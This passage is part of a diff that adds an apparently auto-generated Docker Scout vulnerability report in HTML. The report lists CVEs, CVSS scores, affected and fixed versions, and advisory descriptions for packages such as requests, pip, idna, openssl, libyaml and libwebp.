+The reason this currently works for HTTPS connections in Requests is the `Proxy-Authorization` header is also handled by urllib3 with our usage of the ProxyManager in adapters.py with [`proxy_manager_for`](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/adapters.py#L199-L235). This will compute the required proxy headers in `proxy_headers` and pass them to the Proxy Manager, avoiding attaching them directly to the Request object. This will be our preferred option going forward for default usage.
+
+### Patches
+Starting in Requests v2.31.0, Requests will no longer attach this header to redirects with an HTTPS destination. This should have no negative impacts on the default behavior of the library as the proxy credentials are already properly being handled by urllib3's ProxyManager.
+
+For users with custom adapters, this _may_ be potentially breaking if you were already working around this behavior. The previous functionality of `rebuild_proxies` doesn't make sense in any case, so we would encourage any users impacted to migrate any handling of Proxy-Authorization directly into their custom adapter.
+
+### Workarounds
+For users who are not able to update Requests immediately, there is one potential workaround.
+
+You may disable redirects by setting `allow_redirects` to `False` on all calls through Requests top-level APIs. Note that if you're currently relying on redirect behaviors, you will need to capture the 3xx response codes and ensure a new request is made to the redirect destination.
+```
+import requests
+r = requests.get('http://github.com/', allow_redirects=False)
+```
+
+### Credits
+
+This vulnerability was discovered and disclosed by the following individuals.
+
+Dennis Brinkrolf, Haxolot (https://haxolot.com/)
+Tobias Funke, (tobiasfunke93@gmail.com)
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2024-35195?s=github&n=requests&t=pypi&vr=%3C2.32.0"><img alt="medium 5.6: CVE--2024--35195" src="https://img.shields.io/badge/CVE--2024--35195-lightgrey?label=medium%205.6&labelColor=fbb552"/></a> <i>Always-Incorrect Control Flow Implementation</i>
+
+<table>
+<tr><td>Affected range</td><td><code><2.32.0</code></td></tr>
+<tr><td>Fixed version</td><td><code>2.32.0</code></td></tr>
+<tr><td>CVSS Score</td><td><code>5.6</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.046%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+When using a `requests.Session`, if the first request to a given origin is made with `verify=False`, TLS certificate verification may remain disabled for all subsequent requests to that origin, even if `verify=True` is explicitly specified later.
+
+This occurs because the underlying connection is reused from the session's connection pool, causing the initial TLS verification setting to persist for the lifetime of the pooled connection. As a result, applications may unintentionally send requests without certificate verification, leading to potential man-in-the-middle attacks and compromised confidentiality or integrity.
+
+This behavior affects versions of `requests` prior to 2.32.0.
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2024-47081?s=github&n=requests&t=pypi&vr=%3C2.32.4"><img alt="medium 5.3: CVE--2024--47081" src="https://img.shields.io/badge/CVE--2024--47081-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Insufficiently Protected Credentials</i>
+
+<table>
+<tr><td>Affected range</td><td><code><2.32.4</code></td></tr>
+<tr><td>Fixed version</td><td><code>2.32.4</code></td></tr>
+<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.070%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+### Impact
+
+Due to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.
+
+### Workarounds
+For older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on your Requests Session ([docs](https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env)).
+
+### References
+https://github.com/psf/requests/pull/6965
+https://seclists.org/fulldisclosure/2025/Jun/2
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2026-25645?s=github&n=requests&t=pypi&vr=%3C2.33.0"><img alt="medium 4.4: CVE--2026--25645" src="https://img.shields.io/badge/CVE--2026--25645-lightgrey?label=medium%204.4&labelColor=fbb552"/></a> <i>Insecure Temporary File</i>
+
+<table>
+<tr><td>Affected range</td><td><code><2.33.0</code></td></tr>
+<tr><td>Fixed version</td><td><code>2.33.0</code></td></tr>
+<tr><td>CVSS Score</td><td><code>4.4</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:N/I:H/A:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.004%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+### Impact
+The `requests.utils.extract_zipped_paths()` utility function uses a predictable filename when extracting files from zip archives into the system temporary directory. If the target file already exists, it is reused without validation. A local attacker with write access to the temp directory could pre-create a malicious file that would be loaded in place of the legitimate one.
+
+### Affected usages
+**Standard usage of the Requests library is not affected by this vulnerability.** Only applications that call `extract_zipped_paths()` directly are impacted.
+
+### Remediation
+Upgrade to at least Requests 2.33.0, where the library now extracts files to a non-deterministic location.
+
+If developers are unable to upgrade, they can set `TMPDIR` in their environment to a directory with restricted write access.
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>pip</strong> <code>23.0.1</code> (pypi)</summary>
+
+<small><code>pkg:pypi/pip@23.0.1</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2023-5752?s=github&n=pip&t=pypi&vr=%3C23.3"><img alt="medium 6.8: CVE--2023--5752" src="https://img.shields.io/badge/CVE--2023--5752-lightgrey?label=medium%206.8&labelColor=fbb552"/></a> <i>Improper Neutralization of Special Elements used in a Command ('Command Injection')</i>
+
+<table>
+<tr><td>Affected range</td><td><code><23.3</code></td></tr>
+<tr><td>Fixed version</td><td><code>23.3</code></td></tr>
+<tr><td>CVSS Score</td><td><code>6.8</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.075%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>23rd percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+When installing a package from a Mercurial VCS URL, e.g. `pip install hg+...`, with pip prior to v23.3, the specified Mercurial revision could be used to inject arbitrary configuration options to the `hg clone` call (e.g. `--config`). Controlling the Mercurial configuration can modify how and which repository is installed. This vulnerability does not affect users who aren't installing from Mercurial.
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2025-8869?s=github&n=pip&t=pypi&vr=%3C%3D25.2"><img alt="medium 5.9: CVE--2025--8869" src="https://img.shields.io/badge/CVE--2025--8869-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Improper Link Resolution Before File Access ('Link Following')</i>
+
+<table>
+<tr><td>Affected range</td><td><code><=25.2</code></td></tr>
+<tr><td>Fixed version</td><td><code>25.3</code></td></tr>
+<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.020%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+When extracting a tar archive pip may not check symbolic links point into the extraction directory if the tarfile module doesn't implement PEP 706. Note that upgrading pip to a "fixed" version for this vulnerability doesn't fix all known vulnerabilities that are remediated by using a Python version that implements PEP 706. Note that this is a vulnerability in pip's fallback implementation of tar extraction for Python versions that don't implement PEP 706 and therefore are not secure to all vulnerabilities in the Python 'tarfile' module. If you're using a Python version that implements PEP 706 then pip doesn't use the "vulnerable" fallback code. Mitigations include upgrading to a version of pip that includes the fix, upgrading to a Python version that implements PEP 706 (Python >=3.9.17, >=3.10.12, >=3.11.4, or >=3.12), applying the linked patch, or inspecting source distributions (sdists) before installation as is already a best-practice.
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2026-1703?s=github&n=pip&t=pypi&vr=%3C26.0"><img alt="low 2.0: CVE--2026--1703" src="https://img.shields.io/badge/CVE--2026--1703-lightgrey?label=low%202.0&labelColor=fce1a9"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>
+
+<table>
+<tr><td>Affected range</td><td><code><26.0</code></td></tr>
+<tr><td>Fixed version</td><td><code>26.0</code></td></tr>
+<tr><td>CVSS Score</td><td><code>2</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:A/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.022%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+When pip is installing and extracting a maliciously crafted wheel archive, files may be extracted outside the installation directory. The path traversal is limited to prefixes of the installation directory, thus isn't able to inject or overwrite executable files in typical situations.
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>mercurial</strong> <code>4.8.2</code> (pypi)</summary>
+
+<small><code>pkg:pypi/mercurial@4.8.2</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2019-3902?s=github&n=mercurial&t=pypi&vr=%3C4.9"><img alt="medium 5.9: CVE--2019--3902" src="https://img.shields.io/badge/CVE--2019--3902-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>
+
+<table>
+<tr><td>Affected range</td><td><code><4.9</code></td></tr>
+<tr><td>Fixed version</td><td><code>4.9</code></td></tr>
+<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.531%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>67th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+A flaw was found in Mercurial before 4.9. It was possible to use symlinks and subrepositories to defeat Mercurial's path-checking logic and write files outside a repository.
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>idna</strong> <code>2.10</code> (pypi)</summary>
+
+<small><code>pkg:pypi/idna@2.10</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2024-3651?s=github&n=idna&t=pypi&vr=%3C3.7"><img alt="medium 6.9: CVE--2024--3651" src="https://img.shields.io/badge/CVE--2024--3651-lightgrey?label=medium%206.9&labelColor=fbb552"/></a> <i>Inefficient Regular Expression Complexity</i>
+
+<table>
+<tr><td>Affected range</td><td><code><3.7</code></td></tr>
+<tr><td>Fixed version</td><td><code>3.7</code></td></tr>
+<tr><td>CVSS Score</td><td><code>6.9</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.670%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>71st percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+### Impact
+A specially crafted argument to the `idna.encode()` function could consume significant resources. This may lead to a denial-of-service.
+
+### Patches
+The function has been refined to reject such strings without the associated resource consumption in version 3.7.
+
+### Workarounds
+Domain names cannot exceed 253 characters in length, if this length limit is enforced prior to passing the domain to the `idna.encode()` function it should no longer consume significant resources. This is triggered by arbitrarily large inputs that would not occur in normal usage, but may be passed to the library assuming there is no preliminary input validation by the higher-level application.
+
+### References
+* https://huntr.com/bounties/93d78d07-d791-4b39-a845-cbfabc44aadb
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 4" src="https://img.shields.io/badge/L-4-fce1a9"/> <!-- unspecified: 0 --><strong>binutils</strong> <code>2.31.1-16</code> (deb)</summary>
+
+<small><code>pkg:deb/debian/binutils@2.31.1-16?os_distro=buster&os_name=debian&os_version=10</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2023-25587?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=10&vr=%3E%3D2.31.1-16"><img alt="low : CVE--2023--25587" src="https://img.shields.io/badge/CVE--2023--25587-lightgrey?label=low%20&labelColor=fce1a9"/></a> 
+
+<table>
+<tr><td>Affected range</td><td><code>>=2.31.1-16</code></td></tr>
+<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+** REJECT ** DO NOT USE THIS CANDIDATE NUMBER. ConsultIDs: none. Reason: This candidate was withdrawn by its CNA. Further investigation showed that it was not a security issue. Notes: none.
+
+---
+REJECTED
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2023-22608?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=10&vr=%3E%3D2.31.1-16"><img alt="low : CVE--2023--22608" src="https://img.shields.io/badge/CVE--2023--22608-lightgrey?label=low%20&labelColor=fce1a9"/></a> 
+
+<table>
+<tr><td>Affected range</td><td><code>>=2.31.1-16</code></td></tr>
+<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+** REJECT ** DO NOT USE THIS CANDIDATE NUMBER. ConsultIDs: none. Reason: This candidate was withdrawn by its CNA. Further investigation showed that it was not a security issue. Notes: none
+
+---
+REJECTED
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2023-2222?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=10&vr=%3E%3D2.31.1-16"><img alt="low : CVE--2023--2222" src="https://img.shields.io/badge/CVE--2023--2222-lightgrey?label=low%20&labelColor=fce1a9"/></a> 
+
+<table>
+<tr><td>Affected range</td><td><code>>=2.31.1-16</code></td></tr>
+<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+** REJECT ** This was deemed not a security vulnerability by upstream.
+
+---
+REJECTED
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2021-3487?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=10&vr=%3E%3D2.31.1-16"><img alt="low : CVE--2021--3487" src="https://img.shields.io/badge/CVE--2021--3487-lightgrey?label=low%20&labelColor=fce1a9"/></a> 
+
+<table>
+<tr><td>Affected range</td><td><code>>=2.31.1-16</code></td></tr>
+<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
+<tr><td>EPSS Score</td><td><code>0.059%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>28th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+There's a flaw in the BFD library of binutils in versions before 2.36. An attacker who supplies a crafted file to an application linked with BFD, and using the DWARF functionality, could cause an impact to system availability by way of excessive memory consumption.
+
+---
+REJECTED
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>openssl</strong> <code>1.1.1n-0+deb10u5</code> (deb)</summary>
+
+<small><code>pkg:deb/debian/openssl@1.1.1n-0%2Bdeb10u5?os_distro=buster&os_name=debian&os_version=10</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2010-0928?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=10&vr=%3E%3D1.1.1n-0%2Bdeb10u3"><img alt="low : CVE--2010--0928" src="https://img.shields.io/badge/CVE--2010--0928-lightgrey?label=low%20&labelColor=fce1a9"/></a> 
+
+<table>
+<tr><td>Affected range</td><td><code>>=1.1.1n-0+deb10u3</code></td></tr>
+<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
+<tr><td>EPSS Score</td><td><code>0.094%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+OpenSSL 0.9.8i on the Gaisler Research LEON3 SoC on the Xilinx Virtex-II Pro FPGA uses a Fixed Width Exponentiation (FWE) algorithm for certain signature calculations, and does not verify the signature before providing it to a caller, which makes it easier for physically proximate attackers to determine the private key via a modified supply voltage for the microprocessor, related to a "fault-based attack."
+
+---
+http://www.eecs.umich.edu/~valeria/research/publications/DATE10RSA.pdf
+https://github.com/openssl/openssl/discussions/24540
+Fault injection based attacks are not within OpenSSLs threat model according
+to the security policy: https://www.openssl.org/policies/general/security-policy.html
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <img alt="unspecified: 2" src="https://img.shields.io/badge/U-2-lightgrey"/><strong>glib2.0</strong> <code>2.58.3-2+deb10u4</code> (deb)</summary>
+
+<small><code>pkg:deb/debian/glib2.0@2.58.3-2%2Bdeb10u4?os_distro=buster&os_name=debian&os_version=10</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2023-25180?s=debian&n=glib2.0&ns=debian&t=deb&osn=debian&osv=10&vr=%3E%3D2.58.3-2%2Bdeb10u3"><img alt="unspecified : CVE--2023--25180" src="https://img.shields.io/badge/CVE--2023--25180-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 
+
+<table>
+<tr><td>Affected range</td><td><code>>=2.58.3-2+deb10u3</code></td></tr>
+<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+REJECTED
+
+---
+REJECTED
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2023-24593?s=debian&n=glib2.0&ns=debian&t=deb&osn=debian&osv=10&vr=%3E%3D2.58.3-2%2Bdeb10u3"><img alt="unspecified : CVE--2023--24593" src="https://img.shields.io/badge/CVE--2023--24593-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 
+
+<table>
+<tr><td>Affected range</td><td><code>>=2.58.3-2+deb10u3</code></td></tr>
+<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+REJECTED
+
+---
+REJECTED
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <img alt="unspecified: 2" src="https://img.shields.io/badge/U-2-lightgrey"/><strong>libyaml</strong> <code>0.2.1-1</code> (deb)</summary>
+
+<small><code>pkg:deb/debian/libyaml@0.2.1-1?os_distro=buster&os_name=debian&os_version=10</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2024-35329?s=debian&n=libyaml&ns=debian&t=deb&osn=debian&osv=10&vr=%3E%3D0.2.1-1"><img alt="unspecified : CVE--2024--35329" src="https://img.shields.io/badge/CVE--2024--35329-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 
+
+<table>
+<tr><td>Affected range</td><td><code>>=0.2.1-1</code></td></tr>
+<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
+<tr><td>EPSS Score</td><td><code>0.043%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+libyaml 0.2.5 is vulnerable to a heap-based Buffer Overflow in yaml_document_add_sequence in api.c.
+
+---
+REJECTED
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2024-3205?s=debian&n=libyaml&ns=debian&t=deb&osn=debian&osv=10&vr=%3E%3D0.2.1-1"><img alt="unspecified : CVE--2024--3205" src="https://img.shields.io/badge/CVE--2024--3205-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 
+
+<table>
+<tr><td>Affected range</td><td><code>>=0.2.1-1</code></td></tr>
+<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
+<tr><td>EPSS Score</td><td><code>0.043%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+A vulnerability was found in yaml libyaml up to 0.2.5 and classified as critical. Affected by this issue is the function yaml_emitter_emit_flow_sequence_item of the file /src/libyaml/src/emitter.c. The manipulation leads to heap-based buffer overflow. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-259052. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.
+
+---
+REJECTED
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <img alt="unspecified: 2" src="https://img.shields.io/badge/U-2-lightgrey"/><strong>tiff</strong> <code>4.1.0+git191117-2~deb10u7</code> (deb)</summary>
+
+<small><code>pkg:deb/debian/tiff@4.1.0%2Bgit191117-2~deb10u7?os_distro=buster&os_name=debian&os_version=10</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2023-38289?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=10&vr=%3C4.1.0%2Bgit191117-2%7Edeb10u8"><img alt="unspecified : CVE--2023--38289" src="https://img.shields.io/badge/CVE--2023--38289-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 
+
+<table>
+<tr><td>Affected range</td><td><code><4.1.0+git191117-2~deb10u8</code></td></tr>
+<tr><td>Fixed version</td><td><code>4.1.0+git191117-2~deb10u8</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+REJECTED
+
+---
+REJECTED
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2023-38288?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=10&vr=%3C4.1.0%2Bgit191117-2%7Edeb10u8"><img alt="unspecified : CVE--2023--38288" src="https://img.shields.io/badge/CVE--2023--38288-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 
+
+<table>
+<tr><td>Affected range</td><td><code><4.1.0+git191117-2~deb10u8</code></td></tr>
+<tr><td>Fixed version</td><td><code>4.1.0+git191117-2~deb10u8</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+REJECTED
+
+---
+REJECTED
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <img alt="unspecified: 1" src="https://img.shields.io/badge/U-1-lightgrey"/><strong>libwebp</strong> <code>0.6.1-2+deb10u2</code> (deb)</summary>
+
+<small><code>pkg:deb/debian/libwebp@0.6.1-2%2Bdeb10u2?os_distro=buster&os_name=debian&os_version=10</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2023-5129?s=debian&n=libwebp&ns=debian&t=deb&osn=debian&osv=10&vr=%3C0.6.1-2%2Bdeb10u3"><img alt="unspecified : CVE--2023--5129" src="https://img.shields.io/badge/CVE--2023--5129-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 
+
+<table>
+<tr><td>Affected range</td><td><code><0.6.1-2+deb10u3</code></td></tr>
+<tr><td>Fixed version</td><td><code>0.6.1-2+deb10u3</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.043%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+With a specially crafted WebP lossless file, libwebp may write data out of bounds to the heap.
+
+The ReadHuffmanCodes() function allocates the HuffmanCode buffer with a size that comes from an array of precomputed sizes: kTableSize. The color_cache_bits value defines which size to use.
+
+The kTableSize array only takes into account sizes for 8-bit first-level table lookups but not second-level table lookups. libwebp allows codes that are up to 15-bit (MAX_ALLOWED_CODE_LENGTH). When BuildHuffmanTable() attempts to fill the second-level tables it may write data out-of-bounds. The OOB write to the undersized array happens in ReplicateValue.
+
+
+
+---
+REJECTED
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <img alt="unspecified: 1" src="https://img.shields.io/badge/U-1-lightgrey"/><strong>freetype</strong> <code>2.9.1-3+deb10u3</code> (deb)</summary>
+
+<small><code>pkg:deb/debian/freetype@2.9.1-3%2Bdeb10u3?os_distro=buster&os_name=debian&os_version=10</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2023-21261?s=debian&n=freetype&ns=debian&t=deb&osn=debian&osv=10&vr=%3E%3D2.9.1-3%2Bdeb10u3"><img alt="unspecified : CVE--2023--21261" src="https://img.shields.io/badge/CVE--2023--21261-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 
+
+<table>
+<tr><td>Affected range</td><td><code>>=2.9.1-3+deb10u3</code></td></tr>
+<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
+<tr><td>EPSS Score</td><td><code>0.049%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+In ft_open_face_internal of ftobjs.c, there is a possible out of bounds read due to a missing bounds check. This could lead to remote information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.
+
+
+
+---
+REJECTED
+
+</blockquote>
+</details>
+</details></td></tr>
+</table>
+
+
+</body>
+</html>
